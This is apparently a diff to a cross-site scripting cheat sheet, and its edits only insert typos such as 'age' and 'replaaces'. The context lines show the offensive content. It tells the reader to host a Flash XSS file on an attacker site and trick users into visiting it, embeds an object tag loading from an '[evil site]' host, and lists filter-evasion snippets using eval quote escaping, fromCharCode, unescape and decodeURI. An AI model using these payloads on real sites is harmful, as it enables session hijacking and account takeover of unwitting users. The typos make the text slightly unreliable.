@@ -33,9 +33,9 @@ Require use interaction
 
 #### EvilCos
 
-Can be downloaded [here](https://github.com/evilcos/xss.swf).
+Can be downloaded from [here](https://github.com/evilcos/xss.swf).
 
-Host the page on a site that you control and trick a user to navigate to it or trigger a HTTP request to the malicious URL.
+Host the age on a site that you control and trick a user to navigate to it or trigger a HTTP request to the malicious URL.
 
 ```
 <object data="[evil site]/xss.wfs">
@@ -150,7 +150,7 @@ Function
 #### Escape quotes
 
 ```
-eval(\'...\')            #the filter replaces ' with \' so by adding \ we obtain \' --> \\'
+eval(\'...\')            #the filter replaaces ' with \' so by adding \ we obtain \' --> \\'
 String.fromCharCode(...) #generate string from sequence of unicode hex chars
 unescape(/%78%u0073%73/.source)                  #decode escaped characters
 decodeURI(/alert(%22...%22)/.source)             #decode URL escaped chars
